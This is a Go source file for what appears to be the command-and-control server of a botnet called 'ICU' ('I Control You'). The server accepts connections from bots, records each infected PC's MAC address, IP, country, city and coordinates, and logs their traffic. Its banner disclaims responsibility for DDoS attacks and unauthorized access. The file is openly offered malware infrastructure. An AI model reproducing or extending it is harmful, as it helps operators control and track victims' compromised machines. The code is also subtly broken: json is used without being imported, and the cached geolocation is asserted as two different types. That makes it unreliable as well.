package modules

import (
	"encoding/hex"
	"errors"
	"fmt"
	"icu/common/config"
	"icu/common/constants"
	"icu/common/types"
	"icu/common/utils"
	"icu/lib"
	"io"
	"net"
	"os"
	"time"
)

type TCPServer struct {
	host   string
	port   int
	cache  *lib.Cache
	logger *lib.Logger
}

func NewTCPServer(cache *lib.Cache) *TCPServer {
	return &TCPServer{
		host:   config.ServerRemoteAddr,
		port:   config.ServerRemotePort,
		cache:  cache,
		logger: lib.NewLogger(),
	}
}

func (this *TCPServer) StartServer() error {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", this.port))
	if err != nil {
		return fmt.Errorf("Error starting server: %v", err)
	}
	defer listener.Close()

	fmt.Print("\033[31m\n" + `  _____ _____ _    _
 |_   _/ ____| |  | | {0.5.0#dev}
   | || |    | |  | |
   | || |    | |  | |
  _| || |____| |__| | I Control You :) :(
 |_____\_____|\____/
` + "\n\033[0m")

	fmt.Println("\033[33m[!] ICU is not responsible for DDoS attacks or unauthorized access. \nThe responsibility for such actions lies with the violators.\n\033[0m")

	this.logger.Info(fmt.Sprintf("Server started %s:%d", this.host, this.port))

	for {
		conn, err := listener.Accept()
		if err != nil {
			this.logger.Error(fmt.Sprintf("Error accepting connection: %v", err))
			continue
		}

		go this.handleConnectionCallback(conn)
	}
}

func (this *TCPServer) handleConnectionCallback(conn net.Conn) {
	defer conn.Close()

	buffer := make([]byte, constants.MAX_PACKET_SIZE)

	n, err := conn.Read(buffer)
	if err != nil {
		fmt.Println(err.Error())
		this.logger.Info(fmt.Sprintf("Error reading data: %s", conn.RemoteAddr()))
		return
	}

	this.handleBot(conn, buffer[:n])
}

func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
	emitter := lib.NewEventEmitter()
	botClient := NewBotClient(conn, this.cache, emitter)
	botClient.isBotConnected = true

	defer func() {
		this.cache.RemoveCache(utils.MacPrettyConvert(botClient.mac))
		this.logger.Info(fmt.Sprintf("Bot disconnect: %s", conn.RemoteAddr()))
	}()

	emitter.On("hello-pack-received", func(received interface{}) {
		this.cache.NewInitial(utils.MacPrettyConvert(botClient.mac))

		// ipgeo unmarshal
		var ipgeoStruct types.IPGeo
		if err := json.Unmarshal([]byte(*botClient.ipgeo), &ipgeoStruct); err != nil {
			return
		}

		this.cache.SetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo", ipgeoStruct, 10*time.Minute)
		cache := this.cache.GetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo").(types.IPGeo)
		this.logger.Info(fmt.Sprintf("CONNECTED PC[%s %s, %s (%f, %f)]", cache.IP, cache.CountryName, cache.City, cache.Latitude, cache.Longitude))
	})

	emitter.On("error", func(error interface{}) {
		this.logger.Error(error.(string))
	})

	// HELLO PACKET
	botClient.parseData(data)
	mac := utils.MacPrettyConvert(botClient.mac)

	buffer := make([]byte, constants.MAX_PACKET_SIZE)
	for {
		data, err := conn.Read(buffer)
		if err != nil {
			if errors.Is(err, io.EOF) {
				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
			}

			if sockErr, ok := err.(*net.OpError); ok && sockErr.Op == "read" && sockErr.Err.Error() == "use of closed network connection" {
				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
			} else if os.IsTimeout(err) {
				this.logger.Info(fmt.Sprintf("Bot disconnect (timeout): %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
			} else {
				this.logger.Error(fmt.Sprintf("Error reading bot from connection: %s", err.Error())) // defer
			}

			break
		}

		this.logger.Info(fmt.Sprintf("DATA[%d]: %s", data, hex.EncodeToString(buffer[:data])))
		botClient.parseData(buffer[:data])
	}
}
